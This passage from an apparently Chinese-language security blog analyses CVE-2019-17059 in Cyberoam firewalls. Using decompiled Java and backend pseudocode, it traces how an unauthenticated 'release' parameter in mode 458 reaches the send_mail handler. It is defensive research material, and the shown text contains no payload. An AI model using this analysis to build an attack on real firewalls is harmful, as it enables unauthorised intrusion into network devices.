<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>                                   </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Controller<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Controller<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>                                                                                                                             </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>APIController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>                                                                                            </span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/APIController<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>                                                                                             </span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>                                   </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Controller<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/sslvpnuserportal/manager/CRSSLAuthenticationManager<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>                                   </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>RefreshServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/corporate/servlet/RefreshServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>                                   </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>TelnetServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/corporate/servlet/TelnetServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>从配置中可以看到前端有几个可访问的接口，其中 &#x2F;Controller 比较关键，它对应的类定义如下</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Controller<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cyberoam.corporate.servlets.CyberoamCommonServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>反编译这个类，部分代码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    int1 = Integer.parseInt(httpServletRequest2.getParameter(<span class="string">&quot;mode&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception ex2) &#123;</span><br><span class="line">    int1 = -<span class="number">447</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (!eventByMode.getOPCode().equals(<span class="string">&quot;login&quot;</span>) &amp;&amp; !eventByMode.getOPCode().equals(<span class="string">&quot;iview_login&quot;</span>) &amp;&amp; eventByMode.getMode() != <span class="number">500</span> &amp;&amp; eventByMode.getMode() != <span class="number">172</span> &amp;&amp; eventByMode.getMode() != <span class="number">404</span> &amp;&amp; eventByMode.getMode() != <span class="number">34</span> &amp;&amp; eventByMode.getMode() != <span class="number">405</span> &amp;&amp; !eventByMode.getOPCode().equals(<span class="string">&quot;login_report&quot;</span>) &amp;&amp; eventByMode.getMode() != <span class="number">451</span> &amp;&amp; eventByMode.getMode() != <span class="number">458</span> &amp;&amp; !eventByMode.getOPCode().equals(<span class="string">&quot;ccc_login&quot;</span>) &amp;&amp; eventByMode.getMode() != <span class="number">603</span> &amp;&amp; eventByMode.getMode() != <span class="number">746</span> &amp;&amp; eventByMode.getMode() != <span class="number">958</span> &amp;&amp; eventByMode.getMode() != <span class="number">605</span> &amp;&amp; eventByMode.getMode() != <span class="number">531</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (eventByMode.getMode() != <span class="number">720</span> &amp;&amp; CheckSession.isAdminSessionLock(httpServletRequest2)) &#123;</span><br><span class="line">        httpServletResponse.getWriter().print(<span class="string">&quot;&#123;\&quot;status\&quot;:597,message:\&quot;Session is Lock\&quot;&#125;&quot;</span>);</span><br><span class="line">        CyberoamLogger.debug(<span class="string">&quot;CSC&quot;</span>, <span class="string">&quot;Lock Response is: 597&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (CheckSession.isSessionExpire(httpServletRequest2)) &#123;</span><br><span class="line">        httpServletResponse.sendRedirect(String.valueOf(httpServletRequest2.getContextPath()) + <span class="string">&quot;/webpages/SessionExpired.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (eventByMode.getRequesttype() == <span class="number">1</span>) &#123;</span><br><span class="line">    transactionBean.setTransactionID(CSCClient.getTransactionID());</span><br><span class="line">    CyberoamAjaxHelper.process(httpServletRequest2, httpServletResponse, eventByMode, transactionBean, sqlReader);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (eventByMode.getRequesttype() == <span class="number">2</span>) &#123;</span><br><span class="line">    transactionBean.setTransactionID(CSCClient.getTransactionID());</span><br><span class="line">    CyberoamCustomHelper.process(httpServletRequest2, httpServletResponse, eventByMode, transactionBean, sqlReader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这段代码从用户请求中获取 mode 参数的值，然后进行数个判断，除特定的一些值以外，都需要进行 session 验证。</p>
<p>如果通过验证，则调用 CyberoamCustomHelper.process 函数，此函数逻辑复杂，简单来讲，它会进一步解析用户提交的请求，根据 mode 值的不同进行不同的处理，以无需身份验证的 458 功能为例，它会调用函数 QuarantineDownloadUtility.handleReleaseRequestFromMail，部分代码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">hashMap.put(<span class="string">&quot;release&quot;</span>, paramHttpServletRequest.getParameter(<span class="string">&quot;release&quot;</span>));</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">hashMap.put(<span class="string">&quot;___username&quot;</span>, str2);</span><br><span class="line">hashMap.put(<span class="string">&quot;currentlyloggedinuserip&quot;</span>, paramHttpServletRequest.getHeader(<span class="string">&quot;X-FORWARDED-FOR&quot;</span>));</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">CyberoamLogger.debug(<span class="string">&quot;Spam Mail&quot;</span>, <span class="string">&quot;Calling opcode --&gt; &quot;</span> + eventBean.getOPCode());</span><br><span class="line">i = cSCClient.sendWizardEvent(eventBean, hashMap, paramSqlReader);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>之后会调用 cSCClient.sendWizardEvent</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">i = send(paramEventBean, jSONObject, paramHttpServletRequest, paramSqlReader);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>这里来到关键位置，send 函数内部会构造出之前提到的类 HTTP 格式数据，并转发到 127.0.0.1 299 端口。</p>
<h3 id="A-2-后端"><a href="#A-2-后端" class="headerlink" title="A.2 后端"></a>A.2 后端</h3><p>查看端口开放信息，找到监听 299 的服务是 csc 二进制文件，启动命令为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">csc -L 3 -c /_conf/csc/csc.conf</span><br></pre></td></tr></table></figure></div>

<p>在 &#x2F;_conf&#x2F;csc&#x2F; 目录下可以找到很多 .conf 文件，每个文件中都是一种类似 perl 的伪代码，通过 IDA 反编译分析 csc 发现程序引用了大量 perl 相关函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-17059-1.png"
                     
                ></p>
<p>经调查 csc 可能修改了原始 perl，自己实现了一套新的 perl 解释器，并在其上添加了格式解析相关逻辑。</p>
<p>前端所有功能发送到后端之后，都会先调用 apiInterface 接口，此接口在 perl 层面实现了鉴权、参数过滤、请求分发等操作。</p>
<p>我们可以利用 tcpdump 截获前后端之间的通信流量</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i lo -A port 299</span><br></pre></td></tr></table></figure></div>

<p>样例请求和响应</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode getCustomerInfo csc/1.2</span><br><span class="line">content-type:json</span><br><span class="line">content-length:118</span><br><span class="line"></span><br><span class="line">&#123;&quot;APIVersion&quot;:&quot;063.051&quot;,&quot;___component&quot;:&quot;LOCAL&quot;,&quot;___username&quot;:&quot;LOCAL&quot;,&quot;mode&quot;:370,&quot;currentlyloggedinuserip&quot;:&quot;127.0.0.1&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">csc/1.2 200 OK</span><br><span class="line">content-length:74</span><br><span class="line"></span><br><span class="line">NULL###NULL###NULL###NULL###NULL###NULL###NULL###NULL###NULL###NULL###NULL</span><br></pre></td></tr></table></figure></div>

<p>以这个请求为例，在 csc 目录下搜索字符串 getCustomerInfo 可以找到此功能的定义</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">OPCODE getCustomerInfo &#123;</span><br><span class="line">	&lt;code&gt;</span><br><span class="line">		$modulename=$request-&gt;&#123;modulename&#125;;</span><br><span class="line">		$custinfo=<span class="string">&quot;fail&quot;</span>;</span><br><span class="line">	&lt;/code&gt;	</span><br><span class="line">	custinfo=DLOPEN(do_nvram_get,customer.info)		</span><br><span class="line"></span><br><span class="line">	ON_FAIL&#123;</span><br><span class="line">		LOG applog <span class="string">&quot;getCustomerInfo opcode failed\n&quot;</span></span><br><span class="line">		REPLY text <span class="string">&quot;fail&quot;</span> <span class="number">500</span></span><br><span class="line">	&#125;</span><br><span class="line">	REPLY text $custinfo <span class="number">200</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> 其余功能的调用类似，都是以类 HTTP 形式发送到 299 端口，然后 csc 找到对应 perl 函数进行调用。</p>
<h3 id="A-3-mode-定义"><a href="#A-3-mode-定义" class="headerlink" title="A.3 mode 定义"></a>A.3 mode 定义</h3><p>代码中有很多 mode，每个 mode 对应 perl 中的不同函数，具体定义可以在 java Modes.class 中找到，部分定义如下</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ACCESS_TIME_POLICY_ADD</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ACCESS_TIME_POLICY_EDIT</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SURFING_QUOTA_POLICY_ADD</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SURFING_QUOTA_POLICY_EDIT</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NAT_POLICY_ADD</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NAT_POLICY_EDIT</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DATA_TRANSFER_POLICY_ADD</span> <span class="operator">=</span> <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DATA_TRANSFER_POLICY_EDIT</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ACCESS_TIME_POLICY_DELETE</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UNICAST_ROUTE_ADD</span> <span class="operator">=</span> <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UNICAST_ROUTE_EDIT</span> <span class="operator">=</span> <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UNICAST_ROUTE_DELETE</span> <span class="operator">=</span> <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MULTICAST_ROUTE_ADD</span> <span class="operator">=</span> <span class="number">14</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MULTICAST_ROUTE_EDIT</span> <span class="operator">=</span> <span class="number">15</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MULTICAST_ROUTE_DELETE</span> <span class="operator">=</span> <span class="number">16</span>;</span><br></pre></td></tr></table></figure></div>



<h2 id="B-漏洞分析"><a href="#B-漏洞分析" class="headerlink" title="B. 漏洞分析"></a>B. 漏洞分析</h2><p>根据披露信息，存在漏洞的功能 mode &#x3D; 458，在 mode 定义中找到功能名称叫做 RELEASE_QUARANTINE_MAIL_FROM_MAIL，同时在 CyberoamCommonServlet 类中可以看到这个功能无需身份验证即可访问。</p>
<p>前端中对此功能处理逻辑</p>
<ol>
<li>CyberoamCustomHelper</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (eventBean.getMode() == <span class="number">458</span>) &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">QuarantineDownloadUtility</span>().handleReleaseRequestFromMail(httpServletRequest, httpServletResponse, sqlReader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>QuarantineDownloadUtility</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleReleaseRequestFromMail</span><span class="params">(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse, SqlReader paramSqlReader)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jSONObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">bool</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        str = paramHttpServletRequest.getParameter(<span class="string">&quot;release&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> decode(str);</span><br><span class="line">        String[] arrayOfString1 = str1.split(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">        <span class="type">byte</span> b;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line">        String[] arrayOfString2;</span><br><span class="line">        <span class="keyword">for</span> (j = (arrayOfString2 = arrayOfString1).length, b = <span class="number">0</span>; b &lt; j; ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> arrayOfString2[b];</span><br><span class="line">            String[] arrayOfString = str2.split(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (arrayOfString.length &gt; <span class="number">2</span>)</span><br><span class="line">                bool = <span class="literal">false</span>; </span><br><span class="line">            jSONObject.put(arrayOfString[<span class="number">0</span>], (arrayOfString.length &gt; <span class="number">1</span>) ? arrayOfString[<span class="number">1</span>] : <span class="string">&quot;&quot;</span>);</span><br><span class="line">            b++;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> ((jSONObject.getString(<span class="string">&quot;hdnSender&quot;</span>).equals(<span class="string">&quot;&quot;</span>) || validateEmail(jSONObject.getString(<span class="string">&quot;hdnSender&quot;</span>))) &amp;&amp; </span><br><span class="line">            validateEmail(jSONObject.getString(<span class="string">&quot;hdnRecipient&quot;</span>)) &amp;&amp; isSafeFilePath(jSONObject.getString(<span class="string">&quot;hdnFilePath&quot;</span>)) &amp;&amp; </span><br><span class="line">            bool) &#123;</span><br><span class="line">            paramHttpServletResponse.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            CyberoamLogger.debug(<span class="string">&quot;Antivirus/AntiSpam&quot;</span>, <span class="string">&quot;CSC Constant value &quot;</span> + CSCConstants.isCCC);</span><br><span class="line">            <span class="type">CSCClient</span> <span class="variable">cSCClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CSCClient</span>();</span><br><span class="line">            HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">            <span class="type">EventBean</span> <span class="variable">eventBean</span> <span class="operator">=</span> EventBean.getEventByMode(<span class="number">363</span>);</span><br><span class="line">            hashMap.put(<span class="string">&quot;release&quot;</span>, paramHttpServletRequest.getParameter(<span class="string">&quot;release&quot;</span>));</span><br><span class="line">            <span class="keyword">if</span> (paramHttpServletRequest != <span class="literal">null</span>) &#123;</span><br><span class="line">                String str2;</span><br><span class="line">                arrayOfString2 = <span class="literal">null</span>;</span><br><span class="line">                <span class="type">HttpSession</span> <span class="variable">httpSession</span> <span class="operator">=</span> paramHttpServletRequest.getSession(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (httpSession != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">SessionBean</span> <span class="variable">sessionBean</span> <span class="operator">=</span> (SessionBean)httpSession.getAttribute(<span class="string">&quot;sessionbean&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (sessionBean != <span class="literal">null</span>) &#123;</span><br><span class="line">                        str2 = sessionBean.getUserName();</span><br><span class="line">                        hashMap.put(<span class="string">&quot;___component&quot;</span>, CSCConstants.COMPONENT_VALUE);</span><br><span class="line">                    &#125; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">if</span> (str2 == <span class="literal">null</span>)</span><br><span class="line">                    str2 = <span class="string">&quot;-&quot;</span>; </span><br><span class="line">                hashMap.put(<span class="string">&quot;___username&quot;</span>, str2);</span><br><span class="line">                hashMap.put(<span class="string">&quot;currentlyloggedinuserip&quot;</span>, paramHttpServletRequest.getHeader(<span class="string">&quot;X-FORWARDED-FOR&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                hashMap.put(<span class="string">&quot;___username&quot;</span>, <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            CyberoamLogger.debug(<span class="string">&quot;Spam Mail&quot;</span>, <span class="string">&quot;Calling opcode --&gt; &quot;</span> + eventBean.getOPCode());</span><br><span class="line">            i = cSCClient.sendWizardEvent(eventBean, hashMap, paramSqlReader);</span><br><span class="line">            CyberoamLogger.debug(<span class="string">&quot;Spam Mail&quot;</span>, <span class="string">&quot;Status After Call--&gt; &quot;</span> + i);</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">200</span>) &#123;</span><br><span class="line">                i = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">547</span>) &#123;</span><br><span class="line">                i = -<span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">548</span>) &#123;</span><br><span class="line">                i = -<span class="number">3</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i = -<span class="number">1</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i = -<span class="number">3</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">        CyberoamLogger.error(<span class="string">&quot;Antivirus/AntiSpam&quot;</span>, <span class="string">&quot;Exception occured while releaseing mail from Spam Quarantined Digest Mail: &quot;</span> + exception, exception);</span><br><span class="line">        i = -<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    CyberoamLogger.debug(<span class="string">&quot;Antivirus/AntiSpam&quot;</span>, <span class="string">&quot;Mail is released  for mode : &quot;</span> + paramHttpServletRequest.getParameter(<span class="string">&quot;mode&quot;</span>));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        paramHttpServletResponse.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> paramHttpServletResponse.getWriter();</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            printWriter.write(<span class="string">&quot;&lt;font&gt;The released email will be scanned and delivered.&lt;/font&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == -<span class="number">2</span>) &#123;</span><br><span class="line">            printWriter.write(<span class="string">&quot;&lt;font&gt;Email has been released or deleted.&lt;/font&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == -<span class="number">3</span>) &#123;</span><br><span class="line">            printWriter.write(<span class="string">&quot;&lt;font&gt;Bad Request.&lt;/font&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            printWriter.write(<span class="string">&quot;&lt;font&gt;Error while releasing email&lt;/font&gt;&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception exception) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li>cSCClient.sendWizardEvent 发送到 299 端口</li>
</ol>
<p>QuarantineDownloadUtility 函数中从请求中获取 release 参数，然后对其进行 base64 解码，解码后进行数个参数判断，如果全部通过则执行</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">EventBean</span> <span class="variable">eventBean</span> <span class="operator">=</span> EventBean.getEventByMode(<span class="number">363</span>);</span><br></pre></td></tr></table></figure></div>

<p>这里会将 mode 重新设置为 363，从定义中得知 363 对应接口名称为 SEND_MAIL。</p>
<p>从 perl 伪代码中搜索能找到 send_mail 函数，部分代码：</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">opcode send_mail&#123;</span><br><span class="line">    $reason = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	$strSubject=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	&lt;<span class="regexp">/code&gt;</span></span><br><span class="line"><span class="regexp">	</span></span><br><span class="line"><span class="regexp">	IF(&quot;defined $request-&gt;&#123;release&#125; and $request-&gt;&#123;release&#125; ne &#x27;&#x27; &quot;)&#123;</span></span><br><span class="line"><span class="regexp">		&lt;code&gt;$param = $request-&gt;&#123;release&#125;;&lt;/</span>code&gt;</span><br><span class="line">		param = DLOPEN(base64_decode,param)</span><br><span class="line">		LOG applog <span class="string">&quot; Decode values :: $param \n&quot;</span></span><br><span class="line">		&lt;code&gt;%requestData = <span class="keyword">split</span>(<span class="regexp">/[&amp;=]/</span>, $param);</span><br><span class="line">			$mailServerHost = $requestData<span class="string">&#123;hdnDestDomain&#125;</span>;</span><br><span class="line">			$mailFrom = $requestData<span class="string">&#123;hdnSender&#125;</span>;</span><br><span class="line">			$mailTo   = $requestData<span class="string">&#123;hdnRecipient&#125;</span>;</span><br><span class="line">			$file = $QUARANTINE_PATH.<span class="string">&quot;/&quot;</span>.$requestData<span class="string">&#123;hdnFilePath&#125;</span>;</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">            $mailfile=$requestData<span class="string">&#123;hdnFilePath&#125;</span>;</span><br><span class="line">            $validate_email=<span class="string">&quot;false&quot;</span>;</span><br><span class="line">            <span class="keyword">my</span> $email_regex=<span class="string">&#x27;^([\.]?[_\-\!\#\&#123;\&#125;\$\%\^\&amp;\*\+\=\|\?\&#x27;\\\\\\/a-zA-Z0-9])*@([a-zA-Z0-9]([-]?[a-zA-Z0-9]+)*\.)+([a-zA-Z0-9]&#123;0,6&#125;)$&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>($requestData<span class="string">&#123;hdnRecipient&#125;</span> =~ <span class="regexp">/$email_regex/</span> &amp;&amp; ((<span class="keyword">defined</span> $requestData<span class="string">&#123;hdnSender&#125;</span> &amp;&amp; $requestData<span class="string">&#123;hdnSender&#125;</span> eq <span class="string">&#x27;&#x27;</span>) || $requestData<span class="string">&#123;hdnSender&#125;</span> =~ <span class="regexp">/$email_regex/</span>) &amp;&amp; <span class="keyword">index</span>($requestData<span class="string">&#123;hdnFilePath&#125;</span>,<span class="string">&#x27;../&#x27;</span>) == -<span class="number">1</span>)&#123;</span><br><span class="line">                 $validate_email=<span class="string">&quot;true&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">	&lt;<span class="regexp">/code&gt;</span></span><br><span class="line"><span class="regexp">          IF(&quot;$validate_email eq &#x27;false&#x27;&quot;)&#123;</span></span><br><span class="line"><span class="regexp">             &lt;code&gt;%response=(&quot;status&quot;=&gt;&quot;548&quot;,&quot;statusmessage&quot;=&gt;&quot;Invalid URL&quot;);&lt;/</span>code&gt;</span><br><span class="line">             REPLY  %response <span class="number">500</span></span><br><span class="line">          &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ELSE&#123;</span><br><span class="line">		<span class="regexp">//</span> ...</span><br><span class="line">	&#125;</span><br><span class="line">	// ...</span><br><span class="line">	LOG applog <span class="string">&quot;Values--&gt;\n&quot;</span></span><br><span class="line">	LOG applog <span class="string">&quot;Mail Server: --&gt; $mailServerHost \n&quot;</span></span><br><span class="line">	LOG applog <span class="string">&quot;File Path: --&gt; $file \n&quot;</span></span><br><span class="line">	LOG applog <span class="string">&quot;Mail From: --&gt; $mailFrom \n&quot;</span></span><br><span class="line">	LOG applog <span class="string">&quot;Mail To: --&gt; $mailTo \n&quot;</span></span><br><span class="line">	LOG applog <span class="string">&quot;Subject: --&gt; $strSubject \n&quot;</span></span><br><span class="line">	IF(<span class="string">&quot; -e $file&quot;</span>)&#123;</span><br><span class="line">	&lt;code&gt;</span><br><span class="line">		$file = $file .<span class="string">&quot;:message/rfc822&quot;</span>;</span><br><span class="line">	%mailreq=(<span class="string">&quot;mailaction&quot;</span>=&gt;<span class="string">&quot;$MAIL_FORWARD&quot;</span>,<span class="string">&quot;subject&quot;</span>=&gt;<span 